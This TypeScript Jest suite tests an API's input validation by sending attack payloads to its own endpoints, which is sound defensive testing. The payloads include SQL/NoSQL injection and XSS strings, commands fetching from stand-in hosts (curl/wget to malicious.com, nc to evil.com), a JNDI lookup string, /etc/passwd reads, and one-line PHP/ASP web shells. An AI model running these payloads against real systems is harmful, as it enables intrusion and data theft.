/**
 * Input Security and Validation Testing Suite
 * 
 * Comprehensive security testing for input handling:
 * - SQL Injection protection
 * - XSS prevention and output encoding
 * - Command injection prevention
 * - File upload security
 * - JSON payload validation
 * - Schema validation and sanitization
 * - NoSQL injection protection
 * - LDAP injection prevention
 * - Path traversal protection
 */

import { describe, test, expect, beforeEach, afterEach } from '@jest/globals';
import request from 'supertest';
import fs from 'fs';
import path from 'path';
import crypto from 'crypto';
import { app } from '../../services/api/src/index';

interface TestUser {
  id: string;
  email: string;
  accessToken: string;
}

describe('Input Security & Validation Testing', () => {
  let testUser: TestUser;
  const uploadDir = '/tmp/test-uploads';

  beforeEach(async () => {
    testUser = await createTestUser();
    
    // Create upload directory for file tests
    if (!fs.existsSync(uploadDir)) {
      fs.mkdirSync(uploadDir, { recursive: true });
    }
  });

  afterEach(async () => {
    await cleanupTestData();
    
    // Clean up uploaded files
    if (fs.existsSync(uploadDir)) {
      fs.rmSync(uploadDir, { recursive: true, force: true });
    }
  });

  describe('SQL Injection Protection Tests', () => {
    test('should prevent classic SQL injection attacks', async () => {
      const sqlInjectionPayloads = [
        // Classic SQL injection
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' OR 1=1 --",
        "admin'--",
        "admin'/*",
        
        // Union-based injection
        "' UNION SELECT * FROM users --",
        "' UNION SELECT password FROM users WHERE username='admin' --",
        
        // Boolean-based blind injection
        "' AND (SELECT COUNT(*) FROM users) > 0 --",
        "' AND (SELECT LENGTH(password) FROM users WHERE id=1) > 10 --",
        
        // Time-based blind injection
        "'; WAITFOR DELAY '00:00:05' --",
        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM users GROUP BY x)a) --",
        
        // Error-based injection
        "' AND ExtractValue(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --",
        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM users GROUP BY x)a) --",
        
        // Second-order injection
        "'; INSERT INTO users (username, password) VALUES ('evil', 'password'); --"
      ];

      for (const payload of sqlInjectionPayloads) {
        // Test in search parameters
        const searchResponse = await request(app)
          .get(`/api/goals?search=${encodeURIComponent(payload)}`)
          .set('Authorization', `Bearer ${testUser.accessToken}`);

        expect([200, 400, 422]).toContain(searchResponse.status);
        if (searchResponse.status === 200) {
          expect(searchResponse.body).not.toContain('mysql');
          expect(searchResponse.body).not.toContain('postgresql');
          expect(searchResponse.body).not.toContain('syntax error');
        }

        // Test in POST body
        const createResponse = await request(app)
          .post('/api/goals')
          .set('Authorization', `Bearer ${testUser.accessToken}`)
          .send({
            title: payload,
            description: `Test description with ${payload}`
          });

        expect([201, 400, 422]).toContain(createResponse.status);

        // Test in PUT body
        const updateResponse = await request(app)
          .put(`/api/users/profile`)
          .set('Authorization', `Bearer ${testUser.accessToken}`)
          .send({
            name: payload,
            bio: `Bio with ${payload}`
          });

        expect([200, 400, 422]).toContain(updateResponse.status);
      }
    });

    test('should prevent NoSQL injection attacks', async () => {
      const noSQLInjectionPayloads = [
        // MongoDB injection
        { $ne: null },
        { $regex: '.*' },
        { $where: 'function() { return true; }' },
        { $gt: '' },
        { $or: [{ username: 'admin' }, { username: 'root' }] },
        
        // String-based NoSQL injection
        "'; return true; var a='",
        "' || '1'=='1",
        "' || this.username=='admin' || '",
        
        // JavaScript injection for MongoDB
        "'; return (function(){var date = new Date(); do{curDate = new Date();}while(curDate-date<10000); return Math.max();})(); var a='",
        "' + (function(){var date = new Date(); do{curDate = new Date();}while(curDate-date<10000); return Math.max();})() + '"
      ];

      for (const payload of noSQLInjectionPayloads) {
        // Test object-based injection
        if (typeof payload === 'object') {
          const response = await request(app)
            .post('/api/auth/login')
            .send({
              email: payload,
              password: 'password'
            });

          expect([400, 401, 422]).toContain(response.status);
        }

        // Test string-based injection
        if (typeof payload === 'string') {
          const response = await request(app)
            .get(`/api/users?filter=${encodeURIComponent(payload)}`)
            .set('Authorization', `Bearer ${testUser.accessToken}`);

          expect([200, 400, 422]).toContain(response.status);
        }
      }
    });

    test('should sanitize special characters in database queries', async () => {
      const specialCharacters = [
        "'", '"', '\\', ';', '--', '/*', '*/', '||', '&&',
        '<', '>', '=', '!=', '<=', '>=', 'LIKE', 'IN'
      ];

      for (const char of specialCharacters) {
        const testString = `Test ${char} input`;
        
        const response = await request(app)
          .post('/api/goals')
          .set('Authorization', `Bearer ${testUser.accessToken}`)
          .send({
            title: testString,
            description: `Description with ${char}`
          });

        if (response.status === 201) {
          // Verify data was properly escaped/sanitized
          const goalId = response.body.id;
          const getResponse = await request(app)
            .get(`/api/goals/${goalId}`)
            .set('Authorization', `Bearer ${testUser.accessToken}`)
            .expect(200);

          // Data should be safely stored and retrieved
          expect(getResponse.body.title).toBe(testString);
        }
      }
    });
  });

  describe('XSS Prevention Tests', () => {
    test('should prevent reflected XSS attacks', async () => {
      const xssPayloads = [
        // Basic XSS
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(1)">',
        '<svg onload="alert(1)">',
        '<iframe src="javascript:alert(1)">',
        
        // Advanced XSS
        '"><script>alert(String.fromCharCode(88,83,83))</script>',
        '<script>fetch("/api/admin/users").then(r=>r.json()).then(d=>console.log(d))</script>',
        '<img src="x" onerror="fetch(\'/api/users/profile\', {method:\'DELETE\'})">',
        
        // Encoded XSS
        '%3Cscript%3Ealert(1)%3C/script%3E',
        '&lt;script&gt;alert(1)&lt;/script&gt;',
        
        // DOM-based XSS attempts
        'javascript:alert(1)',
        'vbscript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        
        // Event handler injection
        'onmouseover="alert(1)"',
        'onfocus="alert(1)" autofocus',
        'onclick="alert(1)"'
      ];

      for (const payload of xssPayloads) {
        // Test in search parameters (reflected)
        const searchResponse = await request(app)
          .get(`/api/content/articles?q=${encodeURIComponent(payload)}`)
          .set('Authorization', `Bearer ${testUser.accessToken}`);

        if (searchResponse.status === 200) {
          const responseText = JSON.stringify(searchResponse.body);
          // Should not contain unescaped script tags or event handlers
          expect(responseText).not.toMatch(/<script[^>]*>/i);
          expect(responseText).not.toMatch(/javascript:/i);
          expect(responseText).not.toMatch(/on\w+\s*=/i);
          expect(responseText).not.toMatch(/alert\s*\(/i);
        }

        // Test in form submissions (stored XSS prevention)
        const createResponse = await request(app)
          .post('/api/content/articles')
          .set('Authorization', `Bearer ${testUser.accessToken}`)
          .send({
            title: payload,
            content: `Article content with ${payload}`,
            tags: [payload]
          });

        if (createResponse.status === 201) {
          const articleId = createResponse.body.id;
          
          // Retrieve and verify content is properly encoded
          const getResponse = await request(app)
            .get(`/api/content/articles/${articleId}`)
            .set('Authorization', `Bearer ${testUser.accessToken}`)
            .expect(200);

          const articleContent = JSON.stringify(getResponse.body);
          expect(articleContent).not.toMatch(/<script[^>]*>/i);
          expect(articleContent).not.toMatch(/javascript:/i);
          expect(articleContent).not.toMatch(/on\w+\s*=/i);
        }
      }
    });

    test('should properly encode output in different contexts', async () => {
      const testData = {
        html: '<div>Test & "quotes" \'apostrophes\'</div>',
        javascript: 'alert("test"); console.log(\'test\');',
        css: 'body { background: url("javascript:alert(1)"); }',
        url: 'http://example.com?param=value&other=test',
        attribute: 'value"onmouseover="alert(1)'
      };

      // Create content with potentially dangerous data
      const response = await request(app)
        .post('/api/users/profile')
        .set('Authorization', `Bearer ${testUser.accessToken}`)
        .send({
          name: testData.html,
          bio: testData.javascript,
          website: testData.url,
          customField: testData.attribute
        });

      if (response.status === 200) {
        // Verify output encoding in API response
        const profileResponse = await request(app)
          .get('/api/users/profile')
          .set('Authorization', `Bearer ${testUser.accessToken}`)
          .expect(200);

        // Check HTML encoding
        expect(profileResponse.body.name).not.toContain('<div>');
        expect(profileResponse.body.name).not.toContain('&quot;');

        // Check JavaScript context encoding
        expect(profileResponse.body.bio).not.toContain('alert(');
        expect(profileResponse.body.bio).not.toContain('console.log');

        // Check URL validation
        if (profileResponse.body.website) {
          expect(profileResponse.body.website).toMatch(/^https?:\/\//);
        }
      }
    });

    test('should prevent XSS in file uploads', async () => {
      const maliciousFileContents = [
        '<?xml version="1.0"?><root><script>alert(1)</script></root>',
        '<html><body><script>alert(1)</script></body></html>',
        'GIF89a<script>alert(1)</script>',
        '\x00\x00\x00\x00<script>alert(1)</script>'
      ];

      const fileExtensions = ['.svg', '.html', '.xml', '.gif'];

      for (let i = 0; i < maliciousFileContents.length; i++) {
        const content = maliciousFileContents[i];
        const extension = fileExtensions[i % fileExtensions.length];
        const filename = `malicious${i}${extension}`;

        // Create malicious file
        const filePath = path.join(uploadDir, filename);
        fs.writeFileSync(filePath, content);

        const uploadResponse = await request(app)
          .post('/api/upload/avatar')
          .set('Authorization', `Bearer ${testUser.accessToken}`)
          .attach('file', filePath);

        // Should reject malicious files
        expect([400, 413, 415, 422]).toContain(uploadResponse.status);
      }
    });
  });

  describe('Command Injection Prevention Tests', () => {
    test('should prevent OS command injection', async () => {
      const commandInjectionPayloads = [
        // Unix command injection
        '; ls -la',
        '| cat /etc/passwd',
        '&& whoami',
        '|| id',
        '$(cat /etc/passwd)',
        '`cat /etc/passwd`',
        
        // Windows command injection
        '& dir',
        '| type C:\\Windows\\System32\\drivers\\etc\\hosts',
        '&& net user',
        
        // Command substitution
        '$(curl http://malicious.com)',
        '`wget http://malicious.com/shell.sh`',
        '${jndi:ldap://malicious.com/a}'
      ];

      for (const payload of commandInjectionPayloads) {
        // Test in filename processing
        const response = await request(app)
          .post('/api/upload/document')
          .set('Authorization', `Bearer ${testUser.accessToken}`)
          .field('filename', payload)
          .attach('file', Buffer.from('test content'), 'test.txt');

        expect([400, 422]).toContain(response.status);

        // Test in file processing parameters
        const processResponse = await request(app)
          .post('/api/files/process')
          .set('Authorization', `Bearer ${testUser.accessToken}`)
          .send({
            filename: payload,
            operation: 'resize'
          });

        expect([400, 422, 404]).toContain(processResponse.status);
      }
    });

    test('should sanitize shell metacharacters', async () => {
      const shellMetacharacters = [
        ';', '|', '&', '$', '`', '>', '<', '(', ')', '{', '}', 
        '[', ']', '*', '?', '~', '!', '^', '"', "'", '\\'
      ];

      for (const char of shellMetacharacters) {
        const testFilename = `test${char}file.txt`;
        
        const response = await request(app)
          .post('/api/files/rename')
          .set('Authorization', `Bearer ${testUser.accessToken}`)
          .send({
            oldName: 'test.txt',
            newName: testFilename
          });

        // Should either reject or sanitize the filename
        if (response.status === 200) {
          expect(response.body.filename).not.toContain(char);
        } else {
          expect([400, 422]).toContain(response.status);
        }
      }
    });
  });

  describe('File Upload Security Tests', () => {
    test('should validate file types and extensions', async () => {
      const maliciousFiles = [
        // Executable files
        { name: 'malware.exe', content: 'MZ\x90\x00...', mimeType: 'application/octet-stream' },
        { name: 'script.php', content: '<?php system($_GET["cmd"]); ?>', mimeType: 'application/x-php' },
        { name: 'backdoor.jsp', content: '<%@ page import="java.io.*" %>', mimeType: 'application/x-jsp' },
        { name: 'shell.asp', content: '<%eval request("cmd")%>', mimeType: 'application/x-asp' },
        
        // Double extension
        { name: 'image.jpg.exe', content: 'fake image', mimeType: 'image/jpeg' },
        { name: 'document.pdf.php', content: 'fake pdf', mimeType: 'application/pdf' },
        
        // MIME type confusion
        { name: 'image.jpg', content: '<?php echo "pwned"; ?>', mimeType: 'image/jpeg' },
        { name: 'document.pdf', content: '<script>alert(1)</script>', mimeType: 'application/pdf' }
      ];

      for (const file of maliciousFiles) {
        const filePath = path.join(uploadDir, file.name);
        fs.writeFileSync(filePath, file.content);

        const response = await request(app)
          .post('/api/upload/file')
          .set('Authorization', `Bearer ${testUser.accessToken}`)
          .attach('file', filePath);

        // Should reject malicious files
        expect([400, 413, 415, 422]).toContain(response.status);
        
        if (response.status !== 200) {
          expect(response.body.error).toMatch(/file type|extension|not allowed/i);
        }
      }
    });

    test('should enforce file size limits', async () => {
      const maxFileSize = 10 * 1024 * 1024; // 10MB
      const oversizedContent = Buffer.alloc(maxFileSize + 1024, 'x');

      const filePath = path.join(uploadDir, 'oversized.txt');
      fs.writeFileSync(filePath, oversizedContent);

      const response = await request(app)
        .post('/api/upload/file')
        .set('Authorization', `Bearer ${testUser.accessToken}`)
        .attach('file', filePath);

      expect([413, 422]).toContain(response.status);
    });

    test('should scan uploaded files for malware signatures', async () => {
      const malwareSignatures = [
        // EICAR test string (harmless test virus)
        'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*',
        
        // Common malware patterns
        'eval(base64_decode(',
        'system($_GET',
        'shell_exec(',
        'exec("rm -rf',
        
        // Embedded script in images
        Buffer.concat([
          Buffer.from([0xFF, 0xD8, 0xFF, 0xE0]), // JPEG header
          Buffer.from('<script>alert(1)</script>')
        ])
      ];

      for (let i = 0; i < malwareSignatures.length; i++) {
        const signature = malwareSignatures[i];
        const filename = `malware${i}.jpg`;
        const filePath = path.join(uploadDir, filename);

        fs.writeFileSync(filePath, signature);

        const response = await request(app)
          .post('/api/upload/image')
          .set('Authorization', `Bearer ${testUser.accessToken}`)
          .attach('file', filePath);

        // Should detect and reject malicious content
        expect([400, 422]).toContain(response.status);
      }
    });

    test('should prevent path traversal in file uploads', async () => {
      const pathTraversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '....//....//....//etc//passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd',
        'C:\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts'
      ];

      for (const payload of pathTraversalPayloads) {
        const content = 'test content';
        const filePath = path.join(uploadDir, 'test.txt');
        fs.writeFileSync(filePath, content);

        const response = await request(app)
          .post('/api/upload/file')
          .set('Authorization', `Bearer ${testUser.accessToken}`)
          .field('path', payload)
          .attach('file', filePath);

        expect([400, 422]).toContain(response.status);
      }
    });
  });

  describe('JSON Schema Validation Tests', () => {
    test('should validate JSON schema strictly', async () => {
      const invalidPayloads = [
        // Type confusion
        { title: 123, description: 'string' }, // title should be string
        { title: 'string', createdAt: 'invalid-date' }, // invalid date format
        { title: 'test', priority: 'invalid-enum' }, // invalid enum value
        
        // Missing required fields
        { description: 'missing title' },
        {}, // completely empty
        
        // Extra fields (if strict validation)
        { title: 'test', description: 'test', maliciousField: 'hacker' },
        { title: 'test', __proto__: { admin: true } },
        { title: 'test', constructor: { prototype: { isAdmin: true } } },
        
        // Array validation
        { title: 'test', tags: 'should-be-array' },
        { title: 'test', tags: [123, 456] }, // should be string array
        
        // Nested object validation
        { title: 'test', metadata: 'should-be-object' },
        { title: 'test', metadata: { invalidNestedField: true } }
      ];

      for (const payload of invalidPayloads) {
        const response = await request(app)
          .post('/api/goals')
          .set('Authorization', `Bearer ${testUser.accessToken}`)
          .send(payload);

        expect([400, 422]).toContain(response.status);
        
        if (response.body.errors) {
          expect(Array.isArray(response.body.errors)).toBe(true);
          expect(response.body.errors.length).toBeGreaterThan(0);
        }
      }
    });

    test('should prevent prototype pollution attacks', async () => {
      const prototypePollutionPayloads = [
        // Direct prototype pollution
        { '__proto__': { admin: true } },
        { 'constructor': { 'prototype': { 'isAdmin': true } } },
        { '__proto__.admin': true },
        
        // Nested prototype pollution
        { user: { '__proto__': { role: 'admin' } } },
        { settings: { 'constructor.prototype.isAdmin': true } },
        
        // Array-based pollution
        ['__proto__', 'admin', true],
        { tags: ['__proto__', 'admin'] },
        
        // JSON parse pollution
        '{"__proto__": {"admin": true}}',
        '{"constructor": {"prototype": {"isAdmin": true}}}'
      ];

      for (const payload of prototypePollutionPayloads) {
        let requestPayload = payload;
        if (typeof payload === 'string') {
          try {
            requestPayload = JSON.parse(payload);
          } catch {
            requestPayload = { data: payload };
          }
        }

        const response = await request(app)
          .post('/api/users/settings')
          .set('Authorization', `Bearer ${testUser.accessToken}`)
          .send(requestPayload);

        // Should reject or sanitize pollution attempts
        expect([400, 422]).toContain(response.status);
      }

      // Verify no pollution occurred
      const emptyObject = {};
      expect((emptyObject as any).admin).toBeUndefined();
      expect((emptyObject as any).isAdmin).toBeUndefined();
    });

    test('should validate deeply nested objects securely', async () => {
      // Create deeply nested object (potential DoS)
      function createDeepObject(depth: number): any {
        if (depth === 0) return { value: 'deep' };
        return { nested: createDeepObject(depth - 1) };
      }

      const deepPayload = {
        title: 'Test',
        settings: createDeepObject(1000) // Very deep nesting
      };

      const response = await request(app)
        .post('/api/users/settings')
        .set('Authorization', `Bearer ${testUser.accessToken}`)
        .send(deepPayload);

      // Should reject excessively deep objects
      expect([400, 413, 422]).toContain(response.status);
    });

    test('should handle circular references safely', async () => {
      // Create circular reference
      const circularObject: any = { title: 'Test' };
      circularObject.self = circularObject;

      // This should not crash the server
      const response = await request(app)
        .post('/api/goals')
        .set('Authorization', `Bearer ${testUser.accessToken}`)
        .send(circularObject);

      expect([400, 422]).toContain(response.status);
    });
  });

  describe('Input Sanitization Tests', () => {
    test('should sanitize HTML in user inputs', async () => {
      const htmlPayloads = [
        '<b>Bold text</b>',
        '<i>Italic text</i>',
        '<u>Underlined text</u>',
        '<p>Paragraph</p>',
        '<div>Division</div>',
        '<span style="color:red">Styled text</span>',
        '<a href="http://example.com">Link</a>',
        '<img src="image.jpg" alt="Image">'
      ];

      for (const payload of htmlPayloads) {
        const response = await request(app)
          .post('/api/content/articles')
          .set('Authorization', `Bearer ${testUser.accessToken}`)
          .send({
            title: `Article with ${payload}`,
            content: payload
          });

        if (response.status === 201) {
          const articleId = response.body.id;
          const getResponse = await request(app)
            .get(`/api/content/articles/${articleId}`)
            .set('Authorization', `Bearer ${testUser.accessToken}`)
            .expect(200);

          // HTML should be either stripped or encoded
          const content = getResponse.body.content;
          if (content.includes('<')) {
            // If HTML is preserved, it should be properly encoded
            expect(content).not.toMatch(/<script/i);
            expect(content).not.toMatch(/javascript:/i);
            expect(content).not.toMatch(/on\w+=/i);
          }
        }
      }
    });

    test('should normalize Unicode input', async () => {
      const unicodePayloads = [
        // Different Unicode representations of the same character
        'café', // NFC normalized
        'cafe\u0301', // NFD normalized (e + combining acute accent)
        'caf\u00E9', // é as single character
        
        // Right-to-left override attacks
        'user\u202Eadmin', // Right-to-left override
        'test\u200B\u200C\u200D\u2060hidden', // Zero-width characters
        
        // Homograph attacks
        'admin', // Regular ASCII
        'аdmin', // Cyrillic 'а' instead of ASCII 'a'
        'admin', // Contains mixed scripts
      ];

      for (const payload of unicodePayloads) {
        const response = await request(app)
          .post('/api/users/profile')
          .set('Authorization', `Bearer ${testUser.accessToken}`)
          .send({
            name: payload,
            username: payload
          });

        if (response.status === 200) {
          const profileResponse = await request(app)
            .get('/api/users/profile')
            .set('Authorization', `Bearer ${testUser.accessToken}`)
            .expect(200);

          // Should normalize or reject confusing Unicode
          const normalizedName = profileResponse.body.name;
          expect(normalizedName).not.toMatch(/[\u202A-\u202E\u2066-\u2069]/); // Directional overrides
          expect(normalizedName).not.toMatch(/[\u200B-\u200D\u2060\uFEFF]/); // Zero-width characters
        }
      }
    });

    test('should validate email addresses securely', async () => {
      const maliciousEmails = [
        // Header injection
        'user@example.com\r\nBcc: evil@hacker.com',
        'user@example.com\nCC: evil@hacker.com',
        'user@example.com%0ABcc:evil@hacker.com',
        
        // Command injection in email
        'user+$(cat /etc/passwd)@example.com',
        'user+`whoami`@example.com',
        'user+|nc evil.com 1234@example.com',
        
        // XSS in email
        'user+<script>alert(1)</script>@example.com',
        'user+"onmouseover=alert(1)"@example.com',
        
        // SQL injection in email
        "user+'OR'1'='1@example.com",
        'user+";DROP TABLE users;--@example.com'
      ];

      for (const email of maliciousEmails) {
        const response = await request(app)
          .post('/api/auth/register')
          .send({
            email: email,
            password: 'ValidPassword123!',
            name: 'Test User'
          });

        expect([400, 422]).toContain(response.status);
        expect(response.body.error).toMatch(/email|invalid|format/i);
      }
    });
  });

  // Helper functions
  async function createTestUser(): Promise<TestUser> {
    const user = {
      id: crypto.randomUUID(),
      email: 'security-test@upcoach.ai',
      accessToken: 'mock-access-token'
    };

    // Mock user creation and token generation
    return user;
  }

  async function cleanupTestData(): Promise<void> {
    // Clean up test data
    try {
      // Remove test articles, goals, etc.
      await request(app)
        .delete('/api/test/cleanup')
        .set('Authorization', `Bearer ${testUser.accessToken}`);
    } catch (error) {
      console.log('Cleanup error:', error);
    }
  }
});